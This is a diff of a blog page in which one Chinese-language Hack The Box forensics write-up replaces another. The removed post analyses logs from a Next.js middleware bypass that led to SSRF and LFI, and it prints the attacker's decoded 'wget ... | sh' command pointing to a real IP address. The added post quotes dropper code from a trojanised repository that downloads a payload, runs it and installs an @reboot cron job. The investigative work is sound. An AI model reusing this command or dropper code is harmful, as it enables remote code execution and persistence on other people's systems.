@@ -8,7 +8,7 @@
   name="viewport"
   content="width=device-width, initial-scale=1, shrink-to-fit=no"
 /><title>
-  HTB-NeuroSync D | Wuvoun
+  HTB-Psittaciformes | Wuvoun
 </title>
 <meta
   name="description"
@@ -37,12 +37,12 @@
     crossorigin="anonymous"
   /><link rel="stylesheet" href="/css/loader.min.ac746e154f756f8220326eeb52a719f142ab038be5a8ddf30ea5ef15ef2356ea.css" />
 <meta property="og:type" content="website" />
-  <meta property="og:title" content="HTB-NeuroSync D | Wuvoun" />
+  <meta property="og:title" content="HTB-Psittaciformes | Wuvoun" />
   <meta
     property="og:description"
     content="少女祈祷中..."
   />
-  <meta property="og:url" content="https://wuvoun.github.io/post/neurosync-d/" />
+  <meta property="og:url" content="https://wuvoun.github.io/post/htb-psittaciformes/" />
   <meta
     property="og:site_name"
     content="Wuvoun"
@@ -52,8 +52,8 @@
     content="/"
   />
   <meta property="article:author" content="Wuvoun" />
-  <meta property="article:published_time" content="2025-09-09T02:27:06&#43;08:00" />
-  <meta property="article:modified_time" content="2025-09-09T02:27:06&#43;08:00" /><meta property="article:tag" content="DFIR" /><meta name="twitter:card" content="summary" />
+  <meta property="article:published_time" content="2025-09-15T02:48:34&#43;08:00" />
+  <meta property="article:modified_time" content="2025-09-15T02:48:34&#43;08:00" /><meta property="article:tag" content="DFIR" /><meta name="twitter:card" content="summary" />
   <meta name="twitter:image" content="/" />
 <link rel="shortcut icon" href="/favicon1.ico"><link rel="stylesheet" href="/css/main.min.5a853f279b790b623408299f44544bf0b98ef360d87a9d68d6dcd3848c735f90.css" />
 <link
@@ -126,9 +126,9 @@ This article does not have a corresponding language version
       </span><a id="main-nav-toggle" class="nav-icon"></a>
   </nav>
   <nav id="sub-nav"></nav></div>
-<header id="header"><picture></picture><img  fetchpriority="high" src="/images/banner.png" alt="HTB-NeuroSync D"><div id="header-outer">
+<header id="header"><picture></picture><img  fetchpriority="high" src="/images/banner.png" alt="HTB-Psittaciformes"><div id="header-outer">
     <div id="header-title"><a href="/" id="logo">
-            <h1 data-aos="slide-up">HTB-NeuroSync D</h1>
+            <h1 data-aos="slide-up">HTB-Psittaciformes</h1>
           </a><h2 id="subtitle-wrap" data-aos="slide-down"></h2></div>
   </div>
 </header><div id="content"
@@ -140,7 +140,22 @@ This article does not have a corresponding language version
     ><div class="sidebar-toc-sidebar"><div class="sidebar-toc">
   <h3 class="toc-title">Contents</h3>
   <div class="sidebar-toc-wrapper toc-div-class">
-    <nav id="TableOfContents"></nav>
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#1-what-is-the-name-of-the-repository-utilized-by-the-pen-tester-within-forela-that-resulted-in-the-compromise-of-his-host">1. <strong>What is the name of the repository utilized by the Pen Tester within Forela that resulted in the compromise of his host?</strong></a></li>
+        <li><a href="#2-what-is-the-name-of-the-malicious-function-within-the-script-ran-by-the-pen-tester">2. <strong>What is the name of the malicious function within the script ran by the Pen Tester?</strong></a></li>
+        <li><a href="#3-what-is-the-password-of-the-zip-file-downloaded-within-the-malicious-function">3. <strong>What is the password of the zip file downloaded within the malicious function?</strong></a></li>
+        <li><a href="#4-what-is-the-full-url-of-the-file-downloaded-by-the-attacker">4. <strong>What is the full URL of the file downloaded by the attacker?</strong></a></li>
+        <li><a href="#5-when-did-the-attacker-finally-take-out-the-real-comments-for-the-malicious-function">5. <strong>When did the attacker finally take out the real comments for the malicious function?</strong></a></li>
+        <li><a href="#6-the-attacker-changed-the-url-to-download-the-file-what-was-it-before-the-change">6. <strong>The attacker changed the URL to download the file, what was it before the change?</strong></a></li>
+        <li><a href="#7-what-is-the-mitre-technique-id-utilized-by-the-attacker-to-persist">7. <strong>What is the MITRE technique ID utilized by the attacker to persist?</strong></a></li>
+        <li><a href="#8-what-is-the-mitre-attck-id-for-the-technique-relevant-to-the-binary-the-attacker-runs">8. <strong>What is the Mitre Att&amp;ck ID for the technique relevant to the binary the attacker runs?</strong></a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
   </div>
 </div></div>
           <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -216,11 +231,11 @@ This article does not have a corresponding language version
     class="article-date-link"
     data-aos="zoom-in"
   >
-    <time datetime="2025-09-09 02:27:06 &#43;0800 CST" itemprop="datePublished"
-      >2025-09-09</time
+    <time datetime="2025-09-15 02:48:34 &#43;0800 CST" itemprop="datePublished"
+      >2025-09-15</time
     >
     <time style="display: none;" id="post-update-time"
-      >2025-09-09</time
+      >2025-09-15</time
     >
   </span>
 </div>
@@ -231,115 +246,86 @@ This article does not have a corresponding language version
       >HTB</a
     ></div>
 </div>
-    <div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><h1 id="htb-neurosync-d">
-<a class="header-anchor" href="#htb-neurosync-d"></a>
-HTB-NeuroSync-D
-</h1><p>题目给出下列日志：</p>
-<ul>
-<li><strong>access.log</strong>
-<ul>
-<li>一般是 Web 服务器（Nginx/Apache）或网关的访问日志。</li>
-<li>记录请求 IP、时间、URL、状态码、UA。</li>
-</ul>
-</li>
-<li><strong>bci-device.log</strong>
-<ul>
-<li>可能和系统里的某个 <strong>BCI（Brain-Computer Interface）设备</strong> 或类似命名的模块相关。</li>
-<li>常见用途：设备状态、连接信息、错误上报。</li>
-</ul>
-</li>
-<li><strong>data-api.log</strong>
-<ul>
-<li>通常是后端的数据接口服务日志。</li>
-<li>可能包含 API 请求参数、响应、异常堆栈。</li>
-<li>常用于调试接口调用和数据交互问题。</li>
-</ul>
-</li>
-<li><strong>interface.log</strong>
-<ul>
-<li>Next.js 开发服务器 (<code>next dev</code>) 的运行日志</li>
-</ul>
-</li>
-<li><strong>redis.log</strong>
-<ul>
-<li>Redis 数据库的运行日志。</li>
-<li>一般包含启动信息、持久化状态、错误（比如连接异常、内存不足、RDB/AOF 保存情况）。</li>
-</ul>
-</li>
-</ul>
-<ol>
-<li><strong>What version of Next.js is the application using?</strong></li>
-</ol>
-<p>查看 <strong><code>interface.log</code>日志，可以知道Next.js 15.1.0</strong></p>
-<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image.4jogeg4ij3.png" alt="image.png"></p>
-<ol start="2">
-<li><strong>What local port is the Next.js-based application running on?</strong></li>
-</ol>
-<p>上一题的截图中显示了程序运行在3000端口</p>
-<ol start="3">
-<li><strong>A critical Next.js vulnerability was released in March 2025, and this version appears to be affected. What is the CVE identifier for this vulnerability?</strong></li>
-</ol>
-<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-1.8ok1qk1olf.png" alt="image.png"></p>
-<ol start="4">
-<li><strong>The attacker tried to enumerate some static files that are typically available in the Next.js framework, most likely to retrieve its version. What is the first file he could get?</strong></li>
-</ol>
-<p>查看 <code>access.log</code> 查找请求成功的文件，发现为 <code>/_next/static/chunks/main-app.js</code>  答案为<code>main-app.js</code></p>
-<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-2.4g4ugqbft0.png" alt="image.png"></p>
-<ol start="5">
-<li><strong>Then the attacker appears to have found an endpoint that is potentially affected by the previously identified vulnerability. What is that endpoint?</strong></li>
-</ol>
-<p>查找日志中的 401响应，发现 <code>/api/bci/analytics</code>  一开始没有权限，然后表明可能成功绕过认证，接口确实受漏洞影响。</p>
-<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-3.7i0qhycs06.png" alt="image.png"></p>
-<ol start="6">
-<li><strong>How many requests to this endpoint have resulted in an &ldquo;Unauthorized&rdquo; response?</strong></li>
-</ol>
-<p>全局搜索 <code>401</code> 发现就上图的 <code>5</code> 个未授权响应</p>
-<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-4.esv2c7cg7.png" alt="image.png"></p>
-<ol start="7">
-<li><strong>When is a successful response received from the vulnerable endpoint, meaning that the middleware has been bypassed?</strong></li>
-</ol>
-<p>由上图可知从<code>2025-04-01 11:38:05</code> 开始接受，响应码为200</p>
-<ol start="8">
-<li><strong>Given the previous failed requests, what will most likely be the final value for the vulnerable header used to exploit the vulnerability and bypass the middleware?</strong></li>
-</ol>
-<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-5.70aotdbefc.png" alt="image.png"></p>
-<p>从<strong>interface.log可以看出， 进行4 次尝试试图利用此漏洞，第5次成功，所以易受攻击的标头的最终值为</strong>
-<code>x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware</code></p>
-<ol start="9">
-<li><strong>The attacker chained the vulnerability with an SSRF attack, which allowed them to perform an internal port scan and discover an internal API. On which port is the API accessible?</strong></li>
-</ol>
-<p>查看<strong>data-api.log 日志，从漏洞利用成功开始</strong><code>2025-04-01 11:38:05</code>，发现攻击者使用 curl 触发 SSRF 漏洞并在端口 4000 上发现另一个内部 API</p>
-<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-6.8z6vjpgwqx.png" alt="image.png"></p>
-<ol start="10">
-<li><strong>After the port scan, the attacker starts a brute-force attack to find some vulnerable endpoints in the previously identified API. Which vulnerable endpoint was found?</strong></li>
-</ol>
-<p>在<strong>data-api.log 日志后面找到爆破的记录，找到 <code>/logs</code> 易受攻击的端点</strong></p>
-<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-7.8s3no9urbg.png" alt="image.png"></p>
-<ol start="11">
-<li><strong>When the vulnerable endpoint found was used maliciously for the first time?</strong></li>
-</ol>
-<p>从上图可知，攻击者利用这个端口进行本地文件包含漏洞，时间为 <code>*2025-04-01* *11:39:01*</code></p>
-<ol start="12">
-<li><strong>What is the attack name the endpoint is vulnerable to?</strong></li>
-</ol>
-<p>这个攻击的名称为<code>Local File Inclusion</code></p>
-<ol start="13">
-<li><strong>What is the name of the file that was targeted the last time the vulnerable endpoint was exploited?</strong></li>
-</ol>
-<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-8.13m4mcuvgt.png" alt="image.png"></p>
-<p>从图可知，最后获得的文件为 <code>secret.key</code></p>
-<ol start="14">
-<li><strong>Finally, the attacker uses the sensitive information obtained earlier to create a special command that allows them to perform Redis injection and gain RCE on the system. What is the command string?</strong></li>
-</ol>
-<p>查看 <strong><code>redis.log</code> 日志,查看最后的指令，发现的rce指令</strong></p>
-<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-9.szat7fnbh.png" alt="image.png"></p>
-<ol start="15">
-<li><strong>Once decoded, what is the command?</strong></li>
-</ol>
-<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-10.7aximiqmku.png" alt="image.png"></p>
-<p>解密后得到指令</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget http://185.202.2.147/h4Pln4/run.sh -O- | sh
-</span></span></code></pre></div></div>
+    <div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><h1 id="htb-psittaciformes">
+<a class="header-anchor" href="#htb-psittaciformes"></a>
+HTB-Psittaciformes
+</h1><h3 id="1-what-is-the-name-of-the-repository-utilized-by-the-pen-tester-within-forela-that-resulted-in-the-compromise-of-his-host">
+<a class="header-anchor" href="#1-what-is-the-name-of-the-repository-utilized-by-the-pen-tester-within-forela-that-resulted-in-the-compromise-of-his-host"></a>
+1. <strong>What is the name of the repository utilized by the Pen Tester within Forela that resulted in the compromise of his host?</strong>
+</h3><p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image.8adm89rlgk.webp" alt="image.png"></p>
+<p>打开 <code>Psittaciformes\catscale_parrot_20241223-2233\catscale_out\User_Files\hidden-user-home-dir\home\johnspire\.bash_history</code></p>
+<p>发现明确克隆仓库 <code>autoenum</code> ，<code>sudo su</code>, <code>passwd johnspire</code> → 提权或更改用户密码的迹象</p>
+<h3 id="2-what-is-the-name-of-the-malicious-function-within-the-script-ran-by-the-pen-tester">
+<a class="header-anchor" href="#2-what-is-the-name-of-the-malicious-function-within-the-script-ran-by-the-pen-tester"></a>
+2. <strong>What is the name of the malicious function within the script ran by the Pen Tester?</strong>
+</h3><p>点开https://github.com/pttemplates/autoenum 这个github连接，查看这个脚本</p>
+<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-1.67xtk7t0f1.webp" alt="image.png"></p>
+<p>执行函数为 <code>do_wget_and_run</code></p>
+<h3 id="3-what-is-the-password-of-the-zip-file-downloaded-within-the-malicious-function">
+<a class="header-anchor" href="#3-what-is-the-password-of-the-zip-file-downloaded-within-the-malicious-function"></a>
+3. <strong>What is the password of the zip file downloaded within the malicious function?</strong>
+</h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>do_wget_and_run<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    f1<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://www.dropbox.com/scl/fi/uw8oxug0jydibnorjvyl2&#34;</span>
+</span></span><span style="display:flex;"><span>    f2<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/blob.zip?rlkey=zmbys0idnbab9qnl45xhqn257&amp;st=v22geon6&amp;dl=1&#34;</span>
+</span></span><span style="display:flex;"><span>    OUTPUT_FILE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/tmp/.hidden_</span>$RANDOM<span style="color:#e6db74">.zip&#34;</span>  
+</span></span><span style="display:flex;"><span>    UNZIP_DIR<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/tmp/&#34;</span> 
+</span></span><span style="display:flex;"><span>    part1<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;c3VwZXI=&#34;</span>
+</span></span><span style="display:flex;"><span>    part2<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;aGFja2Vy&#34;</span>
+</span></span><span style="display:flex;"><span>    PASSWORD<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo <span style="color:#e6db74">&#34;</span>$part1$part2<span style="color:#e6db74">&#34;</span> | base64 -d<span style="color:#66d9ef">)</span> 
+</span></span></code></pre></div><p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-2.361xizro7y.webp" alt="image.png"></p>
+<p>zip密码为 <code>superhacker</code></p>
+<h3 id="4-what-is-the-full-url-of-the-file-downloaded-by-the-attacker">
+<a class="header-anchor" href="#4-what-is-the-full-url-of-the-file-downloaded-by-the-attacker"></a>
+4. <strong>What is the full URL of the file downloaded by the attacker?</strong>
+</h3><p>从这段可以知道</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>do_wget_and_run<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    f1<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://www.dropbox.com/scl/fi/uw8oxug0jydibnorjvyl2&#34;</span>
+</span></span><span style="display:flex;"><span>    f2<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/blob.zip?rlkey=zmbys0idnbab9qnl45xhqn257&amp;st=v22geon6&amp;dl=1&#34;</span>
+</span></span></code></pre></div><p>下载链接为 <a href="https://www.dropbox.com/scl/fi/uw8oxug0jydibnorjvyl2/blob.zip?rlkey=zmbys0idnbab9qnl45xhqn257&amp;st=v22geon6&amp;dl=1"><code>ttps://www.dropbox.com/scl/fi/uw8oxug0jydibnorjvyl2/blob.zip?rlkey=zmbys0idnbab9qnl45xhqn257&amp;st=v22geon6&amp;dl=1</code></a></p>
+<h3 id="5-when-did-the-attacker-finally-take-out-the-real-comments-for-the-malicious-function">
+<a class="header-anchor" href="#5-when-did-the-attacker-finally-take-out-the-real-comments-for-the-malicious-function"></a>
+5. <strong>When did the attacker finally take out the real comments for the malicious function?</strong>
+</h3><p>查找提交的历史记录</p>
+<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-3.2dp219b2hr.webp" alt="image.png"></p>
+<p>查询AI,直接告诉你时间 <code>2024-12-23 22:27:58</code></p>
+<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-4.5xazr2ds9r.webp" alt="image.png"></p>
+<h3 id="6-the-attacker-changed-the-url-to-download-the-file-what-was-it-before-the-change">
+<a class="header-anchor" href="#6-the-attacker-changed-the-url-to-download-the-file-what-was-it-before-the-change"></a>
+6. <strong>The attacker changed the URL to download the file, what was it before the change?</strong>
+</h3><p>一个一个提交记录查看，发现url更改 <a href="https://www.dropbox.com/scl/fi/wu0lhwixtk2ap4nnbvv4a/blob.zip?rlkey=gmt8m9e7bd02obueh9q3voi5q&amp;st=em7ud3pb&amp;dl=1"><code>https://www.dropbox.com/scl/fi/wu0lhwixtk2ap4nnbvv4a/blob.zip?rlkey=gmt8m9e7bd02obueh9q3voi5q&amp;st=em7ud3pb&amp;dl=1</code></a></p>
+<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-5.7w76hejalc.webp" alt="image.png"></p>
+<h3 id="7-what-is-the-mitre-technique-id-utilized-by-the-attacker-to-persist">
+<a class="header-anchor" href="#7-what-is-the-mitre-technique-id-utilized-by-the-attacker-to-persist"></a>
+7. <strong>What is the MITRE technique ID utilized by the attacker to persist?</strong>
+</h3><p>查看脚本命令，设置自启动</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Locate and execute the file</span>
+</span></span><span style="display:flex;"><span>    BLOB_PATH<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$UNZIP_DIR<span style="color:#e6db74">/blob&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> -f <span style="color:#e6db74">&#34;</span>$BLOB_PATH<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;------------------------------------------------------------------------------&#34;</span>
+</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34; Finalizing deployment sequence&#34;</span>
+</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;------------------------------------------------------------------------------&#34;</span>
+</span></span><span style="display:flex;"><span>        chmod +x <span style="color:#e6db74">&#34;</span>$BLOB_PATH<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span>$BLOB_PATH<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Add a cron job to run the file at startup</span>
+</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;------------------------------------------------------------------------------&#34;</span>
+</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34; Adding to cron for startup execution&#34;</span>
+</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;------------------------------------------------------------------------------&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">(</span>crontab -l 2&gt;/dev/null; echo <span style="color:#e6db74">&#34;@reboot </span>$BLOB_PATH<span style="color:#e6db74">&#34;</span><span style="color:#f92672">)</span> | crontab -
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;Required component missing from extracted set. Terminating.&#34;</span>
+</span></span><span style="display:flex;"><span>        exit <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>搜索为 <code>T1053.003</code></p>
+<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-6.4qroigovoh.webp" alt="image.png"></p>
+<h3 id="8-what-is-the-mitre-attck-id-for-the-technique-relevant-to-the-binary-the-attacker-runs">
+<a class="header-anchor" href="#8-what-is-the-mitre-attck-id-for-the-technique-relevant-to-the-binary-the-attacker-runs"></a>
+8. <strong>What is the Mitre Att&amp;ck ID for the technique relevant to the binary the attacker runs?</strong>
+</h3><p>该二进制确实在滥用主机资源，搜索为 <strong><code>T1496</code></strong></p>
+<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-7.5mo5xwyk4h.webp" alt="image.png"></p>
+</div>
     <footer class="article-footer"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in">
       <a
         class="article-tag-list-link"
@@ -353,21 +339,13 @@ HTB-NeuroSync-D
     id="article-nav"
     data-aos="fade-up"
   ><div class="article-nav-link-wrap article-nav-link-left"><img
-              data-src="images/c.jpg"
-              data-sizes="auto"
-              alt="AD攻击取证"
-              class="lazyload"
-            /><a href="/post/ad%E6%94%BB%E5%87%BB%E5%8F%96%E8%AF%81/"></a>
-        <div class="article-nav-caption">Prev</div>
-        <h3 class="article-nav-title">AD攻击取证</h3>
-      </div><div class="article-nav-link-wrap article-nav-link-right"><img
               data-src="images/b.jpg"
               data-sizes="auto"
-              alt="HTB Pikaptcha"
+              alt="HTB-Kuber"
               class="lazyload"
-            /><a href="/post/htb-pikaptcha/"></a>
-        <div class="article-nav-caption">Next</div>
-        <h3 class="article-nav-title">HTB Pikaptcha</h3>
+            /><a href="/post/htb-kuber/"></a>
+        <div class="article-nav-caption">Prev</div>
+        <h3 class="article-nav-title">HTB-Kuber</h3>
       </div></nav></article></section>
         </div><footer id="footer">
   <div style="width: 100%; overflow: hidden">
@@ -416,7 +394,22 @@ HTB-NeuroSync-D
   <div class="sidebar-wrap"><div class="sidebar-toc-sidebar"><div class="sidebar-toc">
   <h3 class="toc-title">Contents</h3>
   <div class="sidebar-toc-wrapper toc-div-class">
-    <nav id="TableOfContents"></nav>
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#1-what-is-the-name-of-the-repository-utilized-by-the-pen-tester-within-forela-that-resulted-in-the-compromise-of-his-host">1. <strong>What is the name of the repository utilized by the Pen Tester within Forela that resulted in the compromise of his host?</strong></a></li>
+        <li><a href="#2-what-is-the-name-of-the-malicious-function-within-the-script-ran-by-the-pen-tester">2. <strong>What is the name of the malicious function within the script ran by the Pen Tester?</strong></a></li>
+        <li><a href="#3-what-is-the-password-of-the-zip-file-downloaded-within-the-malicious-function">3. <strong>What is the password of the zip file downloaded within the malicious function?</strong></a></li>
+        <li><a href="#4-what-is-the-full-url-of-the-file-downloaded-by-the-attacker">4. <strong>What is the full URL of the file downloaded by the attacker?</strong></a></li>
+        <li><a href="#5-when-did-the-attacker-finally-take-out-the-real-comments-for-the-malicious-function">5. <strong>When did the attacker finally take out the real comments for the malicious function?</strong></a></li>
+        <li><a href="#6-the-attacker-changed-the-url-to-download-the-file-what-was-it-before-the-change">6. <strong>The attacker changed the URL to download the file, what was it before the change?</strong></a></li>
+        <li><a href="#7-what-is-the-mitre-technique-id-utilized-by-the-attacker-to-persist">7. <strong>What is the MITRE technique ID utilized by the attacker to persist?</strong></a></li>
+        <li><a href="#8-what-is-the-mitre-attck-id-for-the-technique-relevant-to-the-binary-the-attacker-runs">8. <strong>What is the Mitre Att&amp;ck ID for the technique relevant to the binary the attacker runs?</strong></a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
   </div>
 </div></div>
         <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -507,9 +500,9 @@ HTB-NeuroSync-D
   <div><script data-pjax>
         window.REIMU_POST = {
           author: "Wuvoun",
-          title: "HTB-NeuroSync D",
-          url: "https:\/\/wuvoun.github.io\/post\/neurosync-d\/",
-          description: "\rHTB-NeuroSync-D\r题目给出下列日志：\naccess.log 一般是 Web 服务器（Nginx\/Apache）或网关的访问日志。 记录请求 IP、时间、URL、状态码、UA。 bci-device.log 可能和系统里的某个 BCI（Brain-Computer Interface）设备 或类似命名的模块相关。 常见用途：设备状态、连接信息、错误上报。 data-api.log 通常是后端的数据接口服务日志。 可能包含 API 请求参数、响应、异常堆栈。 常用于调试接口调用和数据交互问题。 interface.log Next.js 开发服务器 (next dev) …",
+          title: "HTB-Psittaciformes",
+          url: "https:\/\/wuvoun.github.io\/post\/htb-psittaciformes\/",
+          description: "\rHTB-Psittaciformes\r1. What is the name of the repository utilized by the Pen Tester within Forela that resulted in the compromise of his host?\r打开 Psittaciformes\\catscale_parrot_20241223-2233\\catscale_out\\User_Files\\hidden-user-home-dir\\home\\johnspire\\.bash_history\n发现明确克隆仓库 autoenum ，sudo su, passwd …",
           cover: "https:\/\/wuvoun.github.io\/images\/banner.png",
         };
       </script><script src="/js/insert_highlight.js" integrity="" crossorigin="anonymous" data-pjax></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const pswp = () => {
